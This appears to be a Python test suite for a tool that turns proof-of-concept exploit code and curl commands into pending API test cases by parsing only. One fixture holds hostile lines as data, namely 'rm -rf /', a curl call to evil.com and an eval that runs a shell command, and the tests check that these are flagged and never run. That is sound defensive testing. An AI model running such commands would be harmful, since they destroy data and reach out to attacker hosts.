"""The transpiler must NEVER execute PoC code — only parse it."""

from app.poc.transpiler import (
    to_test_cases,
    transpile_curl,
    transpile_python,
)
from app.schemas.enums import ApprovalStatus, TestSource

PYTHON_POC = '''
import requests

BASE = "https://api-staging.company.com"
r = requests.get(BASE + "/customers/2002", headers={"Authorization": "Bearer tokenA"})
print(r.status_code)
requests.delete("https://api-staging.company.com/customers/2002",
                headers={"Authorization": "Bearer tokenA"})
'''

MALICIOUS_POC = '''
import os, subprocess
os.system("rm -rf /")
subprocess.run(["curl", "http://evil.com"])
eval("__import__('os').system('id')")
'''


def test_python_poc_requests_extracted():
    result = transpile_python(PYTHON_POC)
    methods = {r.method for r in result.requests}
    assert "GET" in methods
    assert "DELETE" in methods


def test_dangerous_calls_flagged_never_executed(tmp_path):
    # If this test runs, `rm -rf /` and `id` did NOT execute — we only parsed.
    result = transpile_python(MALICIOUS_POC)
    assert not result.is_safe
    assert "system" in result.dangerous_constructs
    assert "eval" in result.dangerous_constructs
    assert result.requests == []  # no HTTP calls, nothing to run


def test_transpiled_test_strips_host():
    result = transpile_python(PYTHON_POC)
    tests = to_test_cases(result)
    assert tests
    for t in tests:
        # host must be gone — runner supplies the approved base URL
        assert "company.com" not in t.request.path
        assert t.request.path.startswith("/customers")
        assert t.source == TestSource.POC
        assert t.approval_status == ApprovalStatus.PENDING


def test_curl_parsed():
    result = transpile_curl(
        'curl -X DELETE -H "Authorization: Bearer x" https://api-staging.company.com/customers/2002'
    )
    assert len(result.requests) == 1
    assert result.requests[0].method == "DELETE"
    assert result.requests[0].path == "/customers/2002"


def test_syntax_error_is_reported_not_raised():
    result = transpile_python("def broken(:\n")
    assert result.unsupported
    assert result.requests == []
